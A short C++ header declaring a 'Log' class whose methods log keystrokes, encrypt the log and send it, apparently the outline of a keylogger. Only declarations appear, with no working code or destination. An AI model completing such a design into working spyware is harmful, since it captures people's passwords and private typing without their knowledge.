

class Log {
private:

	int ExtrapolatedKey;
	std::string log;
	std::string EncryptMyString(std::string UnencryptedString);

public:

	int ExtrapolateKey();
	void CreateLog();
	void LogItInt(int key_stroke);
	void LogItChar(std::string Value);
	void SendLog();

};